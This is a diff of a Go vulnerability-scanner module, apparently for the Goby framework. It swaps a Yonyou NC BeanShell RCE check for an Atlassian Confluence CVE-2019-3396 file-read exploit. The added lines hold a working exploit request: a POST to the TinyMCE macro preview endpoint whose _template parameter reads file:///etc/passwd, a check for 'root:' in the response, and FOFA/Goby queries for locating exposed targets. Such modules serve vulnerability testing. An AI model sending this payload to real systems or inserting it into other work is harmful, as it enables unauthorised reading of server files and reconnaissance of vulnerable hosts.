@@ -6,15 +6,15 @@ import (
 
 func init() {
 	expJson := `{
-  "Name": "用友NC BeanShell RCE",
+  "Name": "Atlassian Confluence  文件读取 CVE-2019-3396",
   "Description": "",
   "Product": "",
   "Homepage": "",
   "DisclosureDate": null,
   "Author": "清晨",
-  "FofaQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "GobyQuery": "icon_hash=\"1085941792\" || product=\"Yonyou-UFIDA-NC\"",
-  "Level": "3",
+  "FofaQuery": "app=\"ATLASSIAN-Confluence\" || product=\"ATLASSIAN-Confluence\"",
+  "GobyQuery": "app=\"ATLASSIAN-Confluence\" || product=\"ATLASSIAN-Confluence\"",
+  "Level": "2",
   "Impact": "",
   "Recommendation": "",
   "References": [],
@@ -29,12 +29,14 @@ func init() {
     "AND",
     {
       "Request": {
-        "method": "GET",
-        "uri": "/servlet/~ic/bsh.servlet.BshServlet",
+        "method": "POST",
+        "uri": "/rest/tinymce/1/macro/preview",
         "follow_redirect": true,
-        "header": {},
+        "header": {
+          "Content-Type": "application/json; charset=utf-8"
+        },
         "data_type": "text",
-        "data": ""
+        "data": "{\"contentId\":\"786457\",\"macro\":{\"name\":\"widget\",\"body\":\"\",\"params\":{\"url\":\"https://www.viddler.com/v/23464dc5\",\"width\":\"1000\",\"height\":\"1000\",\"_template\":\"file:///etc/passwd\"}}}"
       },
       "ResponseTest": {
         "type": "group",
@@ -51,7 +53,7 @@ func init() {
             "type": "item",
             "variable": "$body",
             "operation": "contains",
-            "value": "BeanShell",
+            "value": "root:",
             "bz": ""
           }
         ]
@@ -107,7 +109,7 @@ func init() {
   "CVSSScore": "",
   "Translation": {
     "CN": {
-      "Name": "用友NC BeanShell RCE",
+      "Name": "Atlassian Confluence  文件读取 CVE-2019-3396",
       "Product": "",
       "Description": "",
       "Recommendation": "",
@@ -116,7 +118,7 @@ func init() {
       "Tags": []
     },
     "EN": {
-      "Name": "yonyou NC BeanShell RCE",
+      "Name": "Atlassian Confluence file read CVE-2019-3396",
       "Product": "",
       "Description": "",
       "Recommendation": "",
